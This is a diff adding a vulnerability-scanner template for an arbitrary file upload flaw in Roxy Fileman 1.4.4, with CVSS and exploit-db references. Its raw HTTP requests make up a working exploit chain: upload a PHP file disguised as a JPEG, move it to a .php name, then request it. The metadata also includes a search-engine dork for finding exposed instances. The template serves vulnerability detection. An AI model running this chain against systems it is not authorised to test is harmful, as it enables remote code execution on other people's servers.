@@ -1,0 +1,85 @@
+http:
+    - cookie-reuse: true
+      host-redirects: true
+      matchers:
+        - part: body
+          regex:
+            - 99acb46eabd01958e22fae1792e83ca9
+          type: regex
+        - part: header
+          type: word
+          words:
+            - text/html
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      max-redirects: 2
+      raw:
+        - |
+          POST /php/upload.php HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6rbEqFAMRkE0RAB7
+
+          ------WebKitFormBoundary6rbEqFAMRkE0RAB7
+          Content-Disposition: form-data; name="action"
+
+          upload
+          ------WebKitFormBoundary6rbEqFAMRkE0RAB7
+          Content-Disposition: form-data; name="method"
+
+          ajax
+          ------WebKitFormBoundary6rbEqFAMRkE0RAB7
+          Content-Disposition: form-data; name="d"
+
+          /app/Uploads
+          ------WebKitFormBoundary6rbEqFAMRkE0RAB7
+          Content-Disposition: form-data; name="files[]"; filename="{{randstr}}.jpg"
+          Content-Type: image/jpeg
+
+          <?php
+          echo md5('roxyfileman-fileupload');unlink(__FILE__);
+          ?>
+
+          ------WebKitFormBoundary6rbEqFAMRkE0RAB7--
+        - |
+          POST /php/renamefile.php?f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n={{randstr}}.php HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+          X-Requested-With: XMLHttpRequest
+
+          f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n={{randstr}}.php
+        - |
+          POST /php/movefile.php?f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n=%2Fapp%2FUploads%2F{{randstr}}.php HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+          X-Requested-With: XMLHttpRequest
+
+          f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n=%2Fapp%2FUploads%2F{{randstr}}.php
+        - |
+          GET /Uploads/{{randstr}}.php HTTP/1.1
+          Host: {{Hostname}}
+id: roxyfileman-fileupload
+info:
+    author: DhiyaneshDK
+    classification:
+        cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+        cvss-score: 8.8
+        cwe-id: CWE-434
+    description: |
+        Roxy Fileman 1.4.4 is susceptible to remote code execution via the FORBIDDEN_UPLOADS setting, which is checked when renaming an existing file to a new file extension. An attacker can bypass this check and rename already uploaded files to any extension using the move function, which does not perform any checks.
+    metadata:
+        google-query: intitle:"Roxy file manager"
+        max-request: 4
+        verified: true
+    name: Roxy Fileman 1.4.4 - Arbitrary File Upload
+    reference:
+        - https://www.exploit-db.com/exploits/39963
+    severity: high
+    tags:
+        - misconfig
+        - edb
+        - roxy
+        - fileman
+        - fileupload
+        - intrusive
